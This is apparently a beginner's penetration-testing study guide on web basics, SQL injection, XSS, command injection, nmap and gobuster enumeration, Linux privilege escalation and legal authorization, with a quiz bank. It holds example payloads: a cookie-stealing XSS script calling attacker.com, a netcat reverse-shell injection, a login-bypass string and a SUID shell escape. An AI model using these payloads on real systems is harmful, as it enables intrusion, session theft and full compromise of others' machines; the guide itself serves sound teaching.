# Stage 2: Web Fundamentals, Vulnerabilities & Enumeration

Continuing from Stage 1 (networking/Linux/scripting) — this covers how the web works, the core vuln classes, and how real boxes actually get approached end to end.

---

## 🌐 How the Web Works

### Request / Response Basics
```
Browser --- HTTP Request  --> Server
Browser <-- HTTP Response --  Server
```

**Anatomy of a request:**
```
GET /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0...
Cookie: session=abc123
```

**HTTP Methods:**
```
GET     retrieve data (loading a page)
POST    send data (submitting a form)
PUT     update existing data
DELETE  remove data
```
Note: apps sometimes check permissions differently across methods — a real bug class on its own.

**Status codes:**
```
200  OK             success
301/302  Redirect    "go here instead"
401  Unauthorized    need to log in
403  Forbidden       logged in, not allowed
404  Not Found       doesn't exist
500  Server Error    broke on their end
```
`403` vs `404` matters a lot during recon — 403 confirms something exists but is blocked.

### Cookies & Sessions
HTTP is stateless — no memory between requests by default. Cookies solve this:

```
1. Log in → server verifies → creates session server-side
2. Server: Set-Cookie: session=a1b2c3d4e5
3. Browser stores it, sends it automatically on every future request
4. Server checks session ID against logged-in users
```

The cookie is a **claim ticket**, not your password — the real "who are you" data lives server-side.

**Security flags:**
- `HttpOnly` → blocks JavaScript (`document.cookie`) from reading the cookie — defends against XSS-based theft specifically
- `Secure` → cookie only sent over HTTPS, never plain HTTP — protects it on the wire
- `SameSite` → restricts cross-site cookie sending — defends against CSRF

Important distinction: HTTPS encrypts the *connection* (the wire). `HttpOnly` blocks *JavaScript access* on the browser side. Two separate problems, two separate defenses — HTTPS doesn't stop XSS-based cookie theft.

---

## 🎯 Core Vulnerability Classes

All three of these share the same root cause: **user input gets treated as instructions instead of data.**

### SQL Injection (SQLi)
Server builds a database query by directly stuffing in user input:
```sql
SELECT * FROM users WHERE username = 'omar' AND password = '1234'
```

Malicious input breaks out of the intended data slot:
```
Input: ' OR '1'='1
Query becomes: ... WHERE username = '' OR '1'='1' AND password = '...'
```
`'1'='1'` is always true → matches every row → logs in as the first user found, no valid password needed.

Can go further with `UNION SELECT` to pull data from other tables entirely (e.g. dumping password hashes).

**Fix:** parameterized queries — user input is always treated strictly as data, never parsed as code.
```python
# Vulnerable
query = "SELECT * FROM users WHERE username = '" + user_input + "'"
# Safe
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))
```

### Cross-Site Scripting (XSS)
Same pattern, but injecting into the **page itself** so your JS runs in someone else's browser.

```html
<script>alert('hacked')</script>
```
If unsanitized input gets dumped straight into the page HTML, the browser executes it as real code.

Real payload example (ties directly to cookies/sessions above):
```html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```

**Types:**
- **Stored** — saved on the server (e.g. a comment), runs for every visitor. Biggest blast radius.
- **Reflected** — part of a crafted URL, only runs if victim clicks that specific link.

**Fix:** escape/encode special characters (`<`, `>`) before displaying user input, so it renders as visible text instead of executing.

### Command Injection
Same pattern again, this time injecting into an **OS command** running server-side.

```bash
ping -c 1 <user_input>
```
Malicious input:
```
192.168.1.1; whoami
```
Server runs `ping -c 1 192.168.1.1; whoami` — `;` chains a second, unrelated command onto the server's shell.

```
;    run next command regardless of first one's result
&&   run next command only if first succeeds
|    pipe first command's output into the second command
```

This is exactly the kind of "existing foothold" a reverse shell needs — inject the payload instead of a harmless command:
```
192.168.1.1; nc <your_IP> 4444 -e /bin/bash
```

**Fix:** never build shell commands via string concatenation — use safe APIs that pass arguments as data (e.g. Python's `subprocess.run(["ping", "-c", "1", user_input])`).

---

## 🔍 Enumeration

The step before any exploitation — map out what's actually there before attacking blindly.

### nmap
```
nmap -sC -sV -p- <target>
```
- `-sV` → detect service versions (specific versions = searchable exploits, e.g. "Apache 2.4.49" → CVE-2021-41773)
- `-sC` → run default safe scripts
- `-p-` → scan all 65535 ports
- `-A`  → aggressive: OS detection + versions + scripts + traceroute

Reading output:
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1
80/tcp   open  http     Apache 2.4.49
```
Specific version numbers are gold — that's your cue to go research known exploits.

### gobuster
Finds hidden directories/files not linked anywhere visible. **Runs entirely on your machine** — sends requests to the target, no code executes on their side.

```
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```
Reads status codes on results:
```
/admin   403   exists, blocked — worth revisiting if creds are found
/backup  200   accessible NOW — go look at it, could hold creds/configs/source
/login   200   normal page — worth testing for SQLi
```

**Rate limiting adaptation (legitimate methods only):**
- Throttle: `-t 5 --delay 200ms` (fewer threads, spaced requests)
- Smarter, smaller wordlists based on the tech stack you already identified via nmap
- Never: botnets or distributed scanning using devices you don't own — flat out illegal, not a real technique to consider

---

## 🪜 Privilege Escalation

Initial access usually lands you as a low-privilege user, not root. Privesc = finding a misconfiguration that lets you climb — same root theme as the vuln classes: something trusted more than it should be.

**This happens FROM WITHIN your existing shell — one continuous session, not a second break-in.**

### SUID binaries
```
find / -perm -4000 -type f 2>/dev/null
```
SUID = file runs with the *owner's* permissions, not the runner's. If a root-owned binary with SUID set can spawn a shell:
```
find / -exec /bin/bash -p \;
```

### Sudo misconfigurations
```
sudo -l
```
Shows what you can run as root without a password — sometimes overly broad, abusable to break into a full shell.

### Cron jobs
If a root-run scheduled script is writable by your user, edit it — runs as root next execution.

### Kernel exploits
Check kernel version, search for matching public exploits — same pattern as the Apache version check.

**Automation tools:** LinPEAS (Linux) / WinPEAS (Windows) automate this checking — but understanding what they're looking for (above) is what lets you interpret the output instead of running it blind.

---

## 🧩 Full Attack Chain — Two Worked Examples

### Path A: Credentials found, no injection needed
```
nmap → web server + Apache version found
  → gobuster → /backup returns 200
    → visit /backup → find DB credentials in a config file
      → try credentials on SSH → get a real shell
        → privesc (SUID/sudo/cron) → root
```

### Path B: Command injection → reverse shell
```
nmap → web server found
  → gobuster → /tools/ping.php returns 200
    → test injection: 127.0.0.1; whoami → confirms injectable
      → upgrade to full shell: 127.0.0.1; nc <your_IP> 4444 -e /bin/bash
        → catch it: nc -lvnp 4444 (listener running beforehand)
          → privesc → root
```

**Key insight:** reverse shells aren't always needed — Path A logs in directly with found creds. They matter specifically when your foothold only lets you *execute* something (like injection) rather than *log in* somewhere.

---

## ⚖️ Legal / Authorization — The One-Question Test

*"Do I have explicit permission from the actual owner to do this specific thing to this specific target?"*

Yes → legal. No → not legal, regardless of intent or perceived harm.

**Always fine, no permission needed:**
- TryHackMe / HackTheBox boxes
- Localhost / local VMs (DVWA, Metasploitable)

**Fine ONLY with clear, explicit, documented authorization:**
- Any live website/server — including "family" ones; casual verbal permission isn't the same as real scoped authorization, especially for active/production systems
- Bug bounty programs (HackerOne, Bugcrowd) — legitimate real-target practice with defined scope

**Illegal, no exceptions:**
- Botnets / any use of devices you don't own — a serious crime on its own
- Testing any system without clear authorization, "just to check"
- Distributing malware, even for "education"
- Using stolen credentials/data

---

## 📝 Quiz Bank

Use these as self-checks after reading a section — cover the answer, write your own first.

**Web fundamentals**
1. What's the difference between GET and POST?
2. Why does a `403` on a hidden folder tell you something different than a `404`?
3. Why is HTTP "stateless," and what problem does that create?
4. What's actually stored in a cookie?
5. What does `HttpOnly` specifically block — and what does it NOT do (encryption)?
6. What does `Secure` protect, and how does that differ from `HttpOnly`?

**Vuln classes**
7. What does `' OR '1'='1` do to a SQL query's logic?
8. Difference between stored and reflected XSS?
9. What does `;` do when injected into a vulnerable shell command?
10. What's the shared root cause across SQLi, XSS, and command injection?
11. Do parameterized queries work by blocking special characters? If not, how?

**Enumeration & privesc**
12. Where does gobuster/nmap actually run — on your machine or the target's?
13. Why does a specific version number (e.g. "Apache 2.4.49") matter during enumeration?
14. You find `/backup` returns `200` — what's the literal next action?
15. Two legitimate ways to adapt gobuster against rate limiting?
16. Is privilege escalation a second break-in, or does it happen within your existing shell?
17. What does the SUID bit actually mean for a file's execution permissions?

---

*Companion to `cybersec-notes.md` (Stage 1: networking, Linux, scripting, netcat/reverse shells).*
